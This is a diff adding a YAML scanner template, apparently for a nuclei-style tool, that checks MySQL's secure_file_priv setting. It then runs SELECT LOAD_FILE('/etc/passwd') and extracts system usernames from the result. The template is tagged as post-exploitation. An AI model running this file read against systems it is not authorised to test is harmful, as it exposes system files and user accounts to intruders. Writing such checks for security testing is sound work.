@@ -1,0 +1,39 @@
+id: mysql-file-read
+service: [mysql]
+info:
+  name: MySQL Arbitrary File Read Check
+  severity: high
+  tags: mysql,post-exploit,file-read
+
+services:
+  - ops:
+      - db: "SHOW VARIABLES LIKE 'secure_file_priv'"
+        name: file_priv
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: file_priv
+        words: ["NULL"]
+        negative: true
+      - type: dsl
+        dsl: ["contains(file_priv, 'secure_file_priv') && !contains(file_priv, 'NULL')"]
+    extractors:
+      - type: regex
+        name: file_priv_value
+        internal: true
+        part: file_priv
+        regex: ['secure_file_priv\t(.*)']
+        group: 1
+
+  - ops:
+      - db: "SELECT LOAD_FILE('/etc/passwd')"
+        name: passwd
+    matchers:
+      - type: word
+        part: passwd
+        words: ["root:"]
+    extractors:
+      - type: regex
+        name: system_users
+        part: passwd
+        regex: ['^(\w+):']
